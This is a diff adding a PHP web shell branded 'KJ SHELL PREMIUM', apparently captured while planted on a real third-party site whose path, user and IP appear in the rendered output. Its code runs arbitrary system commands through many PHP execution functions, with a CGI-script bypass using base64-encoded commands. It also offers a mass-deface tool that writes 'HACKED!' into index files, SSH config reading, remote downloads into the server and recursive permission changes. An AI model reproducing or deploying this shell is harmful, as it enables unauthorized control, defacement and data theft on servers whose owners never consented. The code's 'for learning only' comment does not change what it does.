+            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">📋 Log Viewer</h4>
+            <div class="form-group">
+                <label>Domain Path:</label>
+                <input type="text" id="log_domain_path" placeholder="/home/user/public_html" style="min-width:350px;">
+            </div>
+            <div class="form-group">
+                <label>Lines:</label>
+                <select id="log_lines">
+                    <option value="20">20</option>
+                    <option value="50" selected>50</option>
+                    <option value="100">100</option>
+                    <option value="200">200</option>
+                    <option value="500">500</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Filter:</label>
+                <input type="text" id="log_filter" placeholder="Filter keyword" style="min-width:200px;">
+            </div>
+            <button onclick="viewLog()" class="btn btn-primary"><i class="fas fa-eye"></i> View Log</button>
+            <button onclick="viewAggregatedLog()" class="btn btn-purple"><i class="fas fa-layer-group"></i> All Domains</button>
+            <button onclick="monitorChanges()" class="btn btn-warning"><i class="fas fa-search"></i> Monitor Changes</button>
+        </div>
+        
+        <div id="log_result" style="display:none;" class="cmd-output"></div>
+        <div id="monitor_result" style="display:none;" class="cmd-output"></div>
+    </div>
+    
+    <!-- Tab: SSH -->
+    <div id="tab-ssh" class="tab-content">
+        <h3><i class="fas fa-shield-alt"></i> SSH Detector <span>Config Reader</span></h3>
+        
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
+            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">🔍 Quick Detection</h4>
+            <div class="quick-commands">
+                <button onclick="runSSHDetect()" class="btn btn-cyan"><i class="fas fa-search"></i> Auto Detect</button>
+                <button onclick="runSSHConfig()" class="btn btn-primary"><i class="fas fa-file-alt"></i> Read Config</button>
+                <button onclick="runSSHPort()" class="btn btn-warning"><i class="fas fa-network-wired"></i> Quick Port</button>
+            </div>
+            <div id="ssh_result" style="display:none;" class="cmd-output"></div>
+        </div>
+        
+                
+        <div style="margin-top:15px;">
+            <h4 style="color:rgba(255,255,255,0.4);font-weight:400;font-size:13px;">📋 Manual Commands</h4>
+            <div class="quick-commands">
+                <button onclick="setCmdAndRun('ps aux | grep [s]shd')">🔍 Process</button>
+                <button onclick="setCmdAndRun('netstat -tulpn | grep sshd')">📡 Port</button>
+                <button onclick="setCmdAndRun('ss -tulpn | grep sshd')">📡 SS</button>
+                <button onclick="setCmdAndRun('systemctl status sshd')">⚙️ Status</button>
+                <button onclick="setCmdAndRun('ssh -V')">📦 Version</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Tab: Extract -->
+    <div id="tab-extract" class="tab-content">
+        <h3><i class="fas fa-file-archive"></i> Extract / Unzip</h3>
+        <form method="post">
+            <div class="form-group">
+                <label>File to extract:</label>
+                <input type="text" name="extract_file" placeholder="/path/to/file.zip" style="min-width:350px;" required>
+            </div>
+            <div class="form-group">
+                <label>Extract to:</label>
+                <input type="text" name="extract_target" placeholder="/path/to/target" style="min-width:350px;" value="/home/u732831926/domains/jsom.org.pk/public_html/host">
+            </div>
+            <button type="submit" name="alfa_extract" value="1" class="btn btn-warning"><i class="fas fa-file-archive"></i> Extract</button>
+        </form>
+            </div>
+    
+    <!-- Tab: Zip -->
+    <div id="tab-zip" class="tab-content">
+        <h3><i class="fas fa-compress"></i> Zip / Compress</h3>
+        <form method="post">
+            <div class="form-group">
+                <label>Source file/dir:</label>
+                <input type="text" name="zip_source" placeholder="/path/to/source" style="min-width:350px;" required>
+            </div>
+            <div class="form-group">
+                <label>Save as:</label>
+                <input type="text" name="zip_dest" placeholder="/path/to/output.zip" style="min-width:350px;" required>
+            </div>
+            <button type="submit" name="alfa_zip" value="1" class="btn btn-success"><i class="fas fa-compress"></i> Create ZIP</button>
+        </form>
+            </div>
+    
+    <!-- Tab: Deface -->
+    <div id="tab-deface" class="tab-content">
+        <h3><i class="fas fa-skull"></i> Mass Deface Tool</h3>
+        <form method="post">
+            <div class="form-group">
+                <label>Target Directory:</label>
+                <input type="text" name="target_dir" value="/home/u732831926/domains/jsom.org.pk/public_html/host" style="min-width:350px;">
+            </div>
+            <div class="form-group">
+                <label>Filename:</label>
+                <input type="text" name="filename" placeholder="index.php" value="index.php" style="min-width:350px;">
+            </div>
+            <div class="form-group">
+                <label>Method:</label>
+                <select name="tipe">
+                    <option value="all">All Files</option>
+                    <option value="index">Index Files Only</option>
+                    <option value="ext">By Extension</option>
+                    <option value="custom">Custom Filename</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Content:</label>
+                <textarea name="content" rows="3" style="min-width:350px;">&lt;?php echo &quot;HACKED!&quot;; ?&gt;</textarea>
+            </div>
+            <button type="submit" name="mass_deface" value="1" class="btn btn-danger" onclick="return confirm('⚠️ Yakin ingin melakukan Mass Deface?')">
+                <i class="fas fa-skull"></i> RUN MASS DEFACE
+            </button>
+        </form>
+            </div>
+    
+    <!-- Tab: Info -->
+    <div id="tab-info" class="tab-content">
+        <h3><i class="fas fa-info-circle"></i> Server Information</h3>
+        <div class="info-grid">
+            <div class="item"><strong>OS:</strong> <span class="value">Linux</span></div>
+            <div class="item"><strong>PHP Version:</strong> <span class="value">7.3.33</span></div>
+            <div class="item"><strong>Current Dir:</strong> <span class="value">/home/u732831926/domains/jsom.org.pk/public_html/host</span></div>
+            <div class="item"><strong>User:</strong> <span class="value">u732831926</span></div>
+            <div class="item"><strong>Server:</strong> <span class="value">jsom.org.pk</span></div>
+            <div class="item"><strong>IP:</strong> <span class="value">185.213.83.142</span></div>
+            <div class="item"><strong>ZipArchive:</strong> <span class="value">✅ Yes</span></div>
+            <div class="item"><strong>cURL:</strong> <span class="value">✅ Yes</span></div>
+            <div class="item"><strong>cPanel:</strong> <span class="value">❌ No</span></div>
+            <div class="item"><strong>SSH:</strong> <span class="value">❌ Not running</span></div>
+        </div>
+    </div>
+    
+    <!-- Stats -->
+    <div class="stats">
+        <i class="fas fa-info-circle"></i>
+        KJ SHELL PREMIUM v10.1 Ultimate •
+        KJ Cyber Security Team •
+        2026-06-25 07:00:54 •
+        Items: 3    </div>
+</div>
+
+<!-- Modals -->
+<div id="editModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('editModal')">&times;</span>
+        <h3><i class="fas fa-edit"></i> Edit File</h3>
+        <form method="post">
+            <input type="hidden" name="file_path" id="edit_file_path">
+            <textarea name="file_content" id="edit_file_content" rows="15"></textarea>
+            <button type="submit" name="edit_file" value="1" class="btn btn-primary"><i class="fas fa-save"></i> Save</button>
+        </form>
+    </div>
+</div>
+
+<div id="renameModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('renameModal')">&times;</span>
+        <h3><i class="fas fa-pen"></i> Rename</h3>
+        <form method="post">
+            <input type="hidden" name="old_name" id="rename_old_name">
+            <div class="form-group">
+                <label>New name:</label>
+                <input type="text" name="new_name" id="rename_new_name" required>
+            </div>
+            <button type="submit" name="rename_item" value="1" class="btn btn-warning"><i class="fas fa-check"></i> Rename</button>
+        </form>
+    </div>
+</div>
+
+<div id="deleteModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('deleteModal')">&times;</span>
+        <h3><i class="fas fa-exclamation-triangle" style="color:#ef5350;"></i> Confirm Delete</h3>
+        <p style="color:rgba(255,255,255,0.6);">Are you sure you want to delete <strong id="delete_item_name" style="color:#ef5350;"></strong>?</p>
+        <form method="post">
+            <input type="hidden" name="delete_item" id="delete_item_input">
+            <button type="submit" class="btn btn-danger"><i class="fas fa-trash"></i> Yes, Delete</button>
+            <button type="button" onclick="closeModal('deleteModal')" class="btn btn-primary">Cancel</button>
+        </form>
+    </div>
+</div>
+
+<div id="chmodModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('chmodModal')">&times;</span>
+        <h3><i class="fas fa-lock"></i> Change Permission</h3>
+        <form method="post">
+            <input type="hidden" name="chmod_path" id="chmod_modal_path">
+            <div class="form-group">
+                <label>File/Folder:</label>
+                <span id="chmod_modal_name" style="color:#e0e4f0;font-weight:500;"></span>
+            </div>
+            <div class="form-group">
+                <label>Permission:</label>
+                <select name="chmod_perm">
+                    <option value="644">644 (rw-r--r--)</option>
+                    <option value="755">755 (rwxr-xr-x)</option>
+                    <option value="777">777 (rwxrwxrwx) ⚠️</option>
+                    <option value="600">600 (rw-------)</option>
+                    <option value="664">664 (rw-rw-r--)</option>
+                    <option value="775">775 (rwxrwxr-x)</option>
+                </select>
+            </div>
+            <button type="submit" name="chmod_single" value="1" class="btn btn-cyan">
+                <i class="fas fa-lock"></i> Change Permission
+            </button>
+        </form>
+    </div>
+</div>
+
+<script>
+function showTab(id) {
+    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+    document.getElementById('tab-' + id).classList.add('active');
+    if (event && event.target) {
+        event.target.closest('.tab').classList.add('active');
+    }
+}
+
+function openModal(id) {
+    document.getElementById(id).style.display = 'flex';
+}
+
+function closeModal(id) {
+    document.getElementById(id).style.display = 'none';
+}
+
+function editFile(filename) {
+    document.getElementById('edit_file_path').value = filename;
+    fetch('?path=%2Fhome%2Fu732831926%2Fdomains%2Fjsom.org.pk%2Fpublic_html%2Fhost&file=' + encodeURIComponent(filename) + '&get_content=1')
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById('edit_file_content').value = data;
+            openModal('editModal');
+        })
+        .catch(() => alert('Failed to load file content'));
+}
+
+function renameItem(oldname) {
+    document.getElementById('rename_old_name').value = oldname;
+    document.getElementById('rename_new_name').value = oldname;
+    openModal('renameModal');
+}
+
+function deleteItem(filename) {
+    document.getElementById('delete_item_name').textContent = filename;
+    document.getElementById('delete_item_input').value = filename;
+    openModal('deleteModal');
+}
+
+function chmodItem(filename, default_perm) {
+    document.getElementById('chmod_modal_path').value = filename;
+    document.getElementById('chmod_modal_name').textContent = filename;
+    var sel = document.querySelector('#chmodModal select[name="chmod_perm"]');
+    if (default_perm) sel.value = default_perm;
+    openModal('chmodModal');
+}
+
+// ========== COMMAND - AUTO CLEAR ==========
+function runCommandAndClear(form) {
+    var cmd = document.getElementById('cmd_input').value;
+    if (!cmd) return false;
+    
+    var resultDiv = document.getElementById('cmd_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Running: ' + cmd + '\n\n';
+    
+    document.getElementById('cmd_input').value = '';
+    
+    fetch('?ajax=command&cmd=' + encodeURIComponent(cmd))
+        .then(response => response.text())
+        .then(data => {
+            resultDiv.innerHTML = '💻 Command: ' + cmd + '\n' + '='.repeat(50) + '\n\n' + data;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = '❌ Error: ' + error;
+        });
+    
+    return false;
+}
+
+function setCmdAndRun(cmd) {
+    document.getElementById('cmd_input').value = cmd;
+    var resultDiv = document.getElementById('cmd_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Running: ' + cmd + '\n\n';
+    
+    document.getElementById('cmd_input').value = '';
+    
+    fetch('?ajax=command&cmd=' + encodeURIComponent(cmd))
+        .then(response => response.text())
+        .then(data => {
+            resultDiv.innerHTML = '💻 Command: ' + cmd + '\n' + '='.repeat(50) + '\n\n' + data;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = '❌ Error: ' + error;
+        });
+}
+
+// ========== DOWNLOAD - AUTO CLEAR ==========
+function runWgetAndClear(form) {
+    var url = document.getElementById('wget_url').value;
+    var filename = document.getElementById('wget_filename').value;
+    if (!url) { alert('Please enter URL!'); return false; }
+    
+    var resultDiv = document.getElementById('download_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Downloading: ' + url + '\n\n';
+    
+    document.getElementById('wget_url').value = '';
+    if (document.getElementById('wget_filename')) {
+        document.getElementById('wget_filename').value = '';
+    }
+    
+    var formData = new FormData();
+    formData.append('wget_download', '1');
+    formData.append('wget_url', url);
+    formData.append('wget_filename', filename);
+    
+    fetch(window.location.href, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(html => {
+        var temp = document.createElement('div');
+        temp.innerHTML = html;
+        var msg = temp.querySelector('.message');
+        if (msg) {
+            resultDiv.innerHTML = msg.innerText;
+        } else {
+            resultDiv.innerHTML = '✅ Download completed!';
+        }
+        location.reload();
+    })
+    .catch(error => {
+        resultDiv.innerHTML = '❌ Error: ' + error;
+    });
+    
+    return false;
+}
+
+function runUnzipAndClear(form) {
+    var file = document.getElementById('unzip_path').value;
+    var target = document.getElementById('unzip_target').value;
+    if (!file) { alert('Please enter file name!'); return false; }
+    
+    var resultDiv = document.getElementById('download_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Extracting: ' + file + '\n\n';
+    
+    document.getElementById('unzip_path').value = '';
+    if (document.getElementById('unzip_target')) {
+        document.getElementById('unzip_target').value = '';
+    }
+    
+    var formData = new FormData();
+    formData.append('unzip_file', '1');
+    formData.append('unzip_path', file);
+    formData.append('unzip_target', target);
+    
+    fetch(window.location.href, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(html => {
+        var temp = document.createElement('div');
+        temp.innerHTML = html;
+        var msg = temp.querySelector('.message');
+        if (msg) {
+            resultDiv.innerHTML = msg.innerText;
+        } else {
+            resultDiv.innerHTML = '✅ Extract completed!';
+        }
+        location.reload();
+    })
+    .catch(error => {
+        resultDiv.innerHTML = '❌ Error: ' + error;
+    });
+    
+    return false;
+}
+
+// ========== LOG FUNCTIONS ==========
+function viewLog(domain_path) {
+    var path = domain_path || document.getElementById('log_domain_path').value;
+    var lines = document.getElementById('log_lines').value;
+    var filter = document.getElementById('log_filter').value;
+    
+    if (!path) { alert('Please enter domain path!'); return; }
+    
+    var resultDiv = document.getElementById('log_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Loading log...\n\n';
+    
+    var url = '?ajax=log_view&path=' + encodeURIComponent(path) + '&lines=' + lines;
+    if (filter) url += '&filter=' + encodeURIComponent(filter);
+    
+    fetch(url)
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function viewAggregatedLog() {
+    var resultDiv = document.getElementById('log_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Loading aggregated logs...\n\n';
+    var lines = document.getElementById('log_lines').value;
+    
+    fetch('?ajax=log_aggregate&lines=' + lines)
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function monitorChanges() {
+    var resultDiv = document.getElementById('monitor_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Scanning for changes...\n\n';
+    var minutes = 10;
+    
+    fetch('?ajax=log_monitor&minutes=' + minutes)
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function monitorDomain(domain_path) {
+    document.getElementById('log_domain_path').value = domain_path;
+    viewLog(domain_path);
+}
+
+// ========== SSH FUNCTIONS ==========
+function runSSHDetect() {
+    var resultDiv = document.getElementById('ssh_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Scanning for SSH...\n\n';
+    
+    fetch('?ajax=ssh_detect')
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function runSSHConfig() {
+    var resultDiv = document.getElementById('ssh_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Reading SSH config...\n\n';
+    
+    fetch('?ajax=ssh_config')
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function runSSHPort() {
+    var resultDiv = document.getElementById('ssh_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Checking SSH port...\n\n';
+    
+    fetch('?ajax=ssh_port')
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+// Close modal on outside click
+window.onclick = function(event) {
+    if (event.target.classList.contains('modal')) {
+        event.target.style.display = 'none';
+    }
+}
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
+    }
+});
+
+// Auto-load current domain path for log
+document.addEventListener('DOMContentLoaded', function() {
+    var currentPath = '/home/u732831926/domains/jsom.org.pk/public_html/host';
+    document.getElementById('log_domain_path').value = currentPath;
+});
+</script>
+
+<?php
+// ============================================================
+// 🚀 KJ SHELL v10.1 - ULTIMATE EDITION
+// ============================================================
+// ⚠️ UNTUK PEMBELAJARAN & TESTING SERVER SENDIRI SAJA
+// ============================================================
+// 
+// 🔥 CUSTOM BRANDING:
+//    - Nama: KJ SHELL PREMIUM
+//    - Team: KJ Cyber Security Team
+//    - Version: 10.1 Ultimate
+//    - Author: KJ Team
+//
+// ✨ FITUR LENGKAP:
+//    ✅ Login Premium Glassmorphism (Compact + Transparan)
+//    ✅ File Manager Premium (Upload, Edit, Delete, Rename, Create Folder)
+//    ✅ Command Execution Live (Auto Clear Input)
+//    ✅ CHMOD Manager (Single + Mass + By Pattern)
+//    ✅ Multi-Domain Activity Log
+//    ✅ SSH Detector & Config Reader
+//    ✅ Download Manager (wget + Auto Clear)
+//    ✅ Extract/Unzip (ZIP, TAR, GZ, RAR) + Auto Clear
+//    ✅ Zip/Compress
+//    ✅ Mass Deface (All, Index, Ext, Custom)
+//    ✅ Server Information
+//    ✅ Ultimate UI dengan Dark Theme
+//    ✅ File/Folder Root Detection (Warna Merah)
+//    ✅ Live Output + Auto Clear Input
+// ============================================================
+
+// ===================== BRANDING CONFIG ======================
+$branding = [
+    'name' => 'KJ SHELL PREMIUM',
+    'short_name' => 'KJ SHELL',
+    'team' => 'KJ Cyber Security Team',
+    'version' => 'v10.1 Ultimate',
+    'author' => 'KJ Team',
+    'year' => '2026',
+    'logo' => '🚀',
+    'icon' => '🛡️'
+];
+
+// ===================== KONFIGURASI ==========================
+$config = [
+    'username' => 'kelincipercobaan',
+    'password_hash' => password_hash('$2y$10$KKenpAXOZmjv4lRr73ll5.7SW/eXdSmgZiLAwFKuDdo2dg38iy0ca', PASSWORD_DEFAULT),
+    'root_path' => __DIR__,
+    'max_upload_size' => 50 * 1024 * 1024,
+    'allowed_extensions' => ['php', 'txt', 'html', 'css', 'js', 'jpg', 'png', 'gif', 'pdf', 'zip', 'tar', 'gz', 'rar'],
+    'session_timeout' => 3600,
+    'log_activity' => true,
+    'log_file' => 'access.log'
+];
+
+session_start();
+
+// ============================================================
+// KJ TEAM SHELL - CORE FUNCTIONS
+// ============================================================
+
+error_reporting(0);
+@ini_set('display_errors', 0);
+@ini_set('max_execution_time', 0);
+@set_time_limit(0);
+@ignore_user_abort(true);
+
+$GLOBALS['sys'] = (strtolower(substr(PHP_OS, 0, 3)) == "win") ? 'win' : 'unix';
+$GLOBALS['cwd'] = str_replace('\\', '/', getcwd());
+$GLOBALS['config'] = $config;
+
+// ---- Base64 Encode/Decode ----
+function __ZW5jb2Rlcg($s) {
+    if(function_exists('base64_encode')) return base64_encode($s);
+    $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+    $enc = '';
+    for($i=0; $i<strlen($s); $i+=3) {
+        $o1 = ord($s[$i]);
+        $o2 = isset($s[$i+1]) ? ord($s[$i+1]) : 0;
+        $o3 = isset($s[$i+2]) ? ord($s[$i+2]) : 0;
+        $bits = ($o1 << 16) | ($o2 << 8) | $o3;
+        $h1 = ($bits >> 18) & 0x3f;
+        $h2 = ($bits >> 12) & 0x3f;
+        $h3 = ($bits >> 6) & 0x3f;
+        $h4 = $bits & 0x3f;
+        $enc .= $b64[$h1] . $b64[$h2] . $b64[$h3] . $b64[$h4];
+    }
+    return $enc;
+}
+
+function __ZGVjb2Rlcg($s) {
+    if(function_exists('base64_decode')) return base64_decode($s);
+    $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+    $dec = '';
+    $s = preg_replace('[^A-Za-z0-9\+\/\=]', "", $s);
+    for($i=0; $i<strlen($s); $i+=4) {
+        $h1 = strpos($b64, $s[$i]);
+        $h2 = strpos($b64, $s[$i+1]);
+        $h3 = strpos($b64, $s[$i+2]);
+        $h4 = strpos($b64, $s[$i+3]);
+        $bits = ($h1 << 18) | ($h2 << 12) | ($h3 << 6) | $h4;
+        $o1 = ($bits >> 16) & 0xff;
+        $o2 = ($bits >> 8) & 0xff;
+        $o3 = $bits & 0xff;
+        $dec .= chr($o1);
+        if($h3 != 64) $dec .= chr($o2);
+        if($h4 != 64) $dec .= chr($o3);
+    }
+    return $dec;
+}
+
+// ---- Command Execution ----
+function alfaEx($in, $re=false, $cgi=true, $all=false) {
+    $data = _alfa_php_cmd($in, $re);
+    if(empty($data) && $cgi || $all) {
+        if($GLOBALS['sys'] == 'unix') {
+            if(strlen(_alfa_php_cmd("whoami")) == 0 || $all) {
+                $cmd = _alfa_cgicmd($in);
+                if(!empty($cmd)) return $cmd;
+            }
+        }
+    }
+    return $data;
+}
+
+function _alfa_php_cmd($in, $re=false) {
+    $out = '';
+    try {
+        if($re) $in = $in . " 2>&1";
+        
+        if(function_exists('exec')) {
+            @exec($in, $out);
+            $out = @join("\n", $out);
+        } elseif(function_exists('passthru')) {
+            ob_start();
+            @passthru($in);
+            $out = ob_get_clean();
+        } elseif(function_exists('system')) {
+            ob_start();
+            @system($in);
+            $out = ob_get_clean();
+        } elseif(function_exists('shell_exec')) {
+            $out = shell_exec($in);
+        } elseif(function_exists("popen") && function_exists("pclose")) {
+            if(is_resource($f = @popen($in, "r"))) {
+                $out = "";
+                while(!@feof($f)) $out .= fread($f, 1024);
+                pclose($f);
+            }
+        } elseif(function_exists('proc_open')) {
+            $pipes = array();
+            $process = @proc_open($in.' 2>&1', array(
+                array("pipe","w"), array("pipe","w"), array("pipe","w")
+            ), $pipes, null);
+            $out = @stream_get_contents($pipes[1]);
+        } elseif(class_exists('COM')) {
+            $ws = new COM('WScript.shell');
+            $exec = $ws->exec('cmd.exe /c '.$in);
+            $stdout = $exec->StdOut();
+            $out = $stdout->ReadAll();
+        }
+    } catch(Exception $e) {}
+    return $out;
+}
+
+function _alfa_cgicmd($cmd, $lang="perl", $set_cookie=false) {
+    $is_curl = function_exists('curl_version');
+    $is_socket = function_exists('fsockopen');
+    
+    if($is_curl || $is_socket) {
+        $cgi_url = "cgibypass." . ($lang == "perl" ? "pl" : "py");
+        $cmd = "check=api&cmd=" . __ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
+        
+        if($is_curl) {
+            $address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://") .
+                       $_SERVER["SERVER_NAME"] . 
+                       dirname($_SERVER["REQUEST_URI"]) . "/" . $cgi_url;
+            $data = _alfa_curl_request($address, "post", $cmd);
+        } elseif($is_socket) {
+            $server = $_SERVER["SERVER_NAME"];
+            $uri = dirname($_SERVER["REQUEST_URI"]) . "/" . $cgi_url;
+            $data = _alfa_socket_request($server, $uri, $cmd);
+        }
+        
+        $out = "";
+        if(strpos($data, "[api]") !== false) {
+            if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)) $out = $res[1];
+        }
+        return trim($out);
+    }
+    return "";
+}
+
+function _alfa_socket_request($server, $uri, $post) {
+    $socket = @fsockopen($server, 80, $errno, $errstr, 15);
+    if($socket) {
+        $http  = "POST {$uri} HTTP/1.0\r\n";
+        $http .= "Host: {$server}\r\n";
+        $http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
+        $http .= "Content-Type: application/x-www-form-urlencoded\r\n";
+        $http .= "Content-length: " . strlen($post) . "\r\n";
+        $http .= "Connection: close\r\n\r\n";
+        $http .= $post . "\r\n\r\n";
+        fwrite($socket, $http);
+        $contents = "";
+        while (!@feof($socket)) $contents .= @fgets($socket, 4096);
+        list($header, $body) = explode("\r\n\r\n", $contents, 2);
+        @fclose($socket);
+        return $body;
+    }
+    return "";
+}
+
+function _alfa_curl_request($url, $method="get", $data="") {
+    if(!function_exists('curl_init')) return false;
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    if($method == 'post') {
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    }
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+function alfaWhich($p) {
+    $path = alfaEx('which ' . $p, false, false);
+    return (!empty($path)) ? strlen($path) : false;
+}
+
+function _alfa_can_runCommand($cgi=true, $cache=true) {
+    if(isset($_COOKIE["alfa_canruncmd"]) && $cache) return true;
+    if(strlen(alfaEx("whoami", false, $cgi)) > 0) {
+        $_COOKIE["alfa_canruncmd"] = true;
+        return true;
+    }
+    return false;
+}
+
+// ============================================================
+// CHMOD MANAGER
+// ============================================================
+
+function chmodSingle($path, $permission) {
+    $full_path = realpath($path);
+    if (!$full_path || !file_exists($full_path)) {
+        return array('status' => false, 'message' => "❌ File/Folder tidak ditemukan: " . $path);
+    }
+    
+    $perm_octal = octdec($permission);
+    
+    if (@chmod($full_path, $perm_octal)) {
+        logActivityMulti("CHMOD: " . $full_path . " → " . $permission, dirname($full_path));
+        return array(
+            'status' => true, 
+            'message' => "✅ Permission changed: " . $full_path . " → " . $permission,
+            'path' => $full_path,
+            'permission' => $permission
+        );
+    } else {
+        $cmd = "chmod " . $permission . " '" . addslashes($full_path) . "' 2>&1";
+        $result = alfaEx($cmd);
+        if (empty($result)) {
+            logActivityMulti("CHMOD (cmd): " . $full_path . " → " . $permission, dirname($full_path));
+            return array(
+                'status' => true,
+                'message' => "✅ Permission changed (via command): " . $full_path . " → " . $permission,
+                'path' => $full_path,
+                'permission' => $permission
+            );
+        } else {
+            return array('status' => false, 'message' => "❌ Gagal change permission: " . $result);
+        }
+    }
+}
+
+function chmodMass($dir, $file_permission = '644', $dir_permission = '755', $recursive = true) {
+    $full_path = realpath($dir);
+    if (!$full_path || !is_dir($full_path)) {
+        return array('status' => false, 'message' => "❌ Direktori tidak ditemukan: " . $dir);
+    }
+    
+    $results = [];
+    $total_files = 0;
+    $total_dirs = 0;
+    $success_files = 0;
+    $success_dirs = 0;
+    $errors = [];
+    
+    if (chmodSingle($full_path, $dir_permission)['status']) {
+        $success_dirs++;
+    } else {
+        $errors[] = "❌ Gagal chmod directory: " . $full_path;
+    }
+    $total_dirs++;
+    
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+    
+    foreach ($iterator as $item) {
+        $path = $item->getPathname();
+        $is_dir = $item->isDir();
+        
+        if ($is_dir) {
+            $total_dirs++;
+            $result = chmodSingle($path, $dir_permission);
+            if ($result['status']) {
+                $success_dirs++;
+                $results[] = $result['message'];
+            } else {
+                $errors[] = $result['message'];
+            }
+        } else {
+            $total_files++;
+            $result = chmodSingle($path, $file_permission);
+            if ($result['status']) {
+                $success_files++;
+                $results[] = $result['message'];
+            } else {
+                $errors[] = $result['message'];
+            }
+        }
+    }
+    
+    $summary = [
+        'status' => (count($errors) == 0),
+        'total_files' => $total_files,
+        'success_files' => $success_files,
+        'total_dirs' => $total_dirs,
+        'success_dirs' => $success_dirs,
+        'errors' => $errors,
+        'message' => "✅ CHMOD Massal selesai!\n   📁 Direktori: " . $success_dirs . "/" . $total_dirs . " berhasil\n   📄 File: " . $success_files . "/" . $total_files . " berhasil\n" . (count($errors) > 0 ? "   ❌ Error: " . count($errors) : "")
+    ];
+    
+    logActivityMulti("Mass CHMOD: " . $full_path . " (file:" . $file_permission . ", dir:" . $dir_permission . ")", $full_path);
+    
+    return $summary;
+}
+
+function chmodByPattern($dir, $pattern, $permission) {
+    $full_path = realpath($dir);
+    if (!$full_path || !is_dir($full_path)) {
+        return array('status' => false, 'message' => "❌ Direktori tidak ditemukan: " . $dir);
+    }
+    
+    $results = [];
+    $total = 0;
+    $success = 0;
+    $errors = [];
+    
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS)
+    );
+    
+    foreach ($iterator as $item) {
+        if (!$item->isFile()) continue;
+        
+        $filename = $item->getFilename();
+        $path = $item->getPathname();
+        
+        $match = false;
+        if (strpos($pattern, '*') !== false) {
+            $pattern_regex = '/^' . str_replace('*', '.*', preg_quote($pattern, '/')) . '$/i';
+            if (preg_match($pattern_regex, $filename)) $match = true;
+        } elseif (strpos($pattern, ',') !== false) {
+            $exts = array_map('trim', explode(',', $pattern));
+            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+            if (in_array($ext, $exts)) $match = true;
+        } else {
+            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+            if ($ext == $pattern) $match = true;
+        }
+        
+        if ($match) {
+            $total++;
+            $result = chmodSingle($path, $permission);
+            if ($result['status']) {
+                $success++;
+                $results[] = $result['message'];
+            } else {
+                $errors[] = $result['message'];
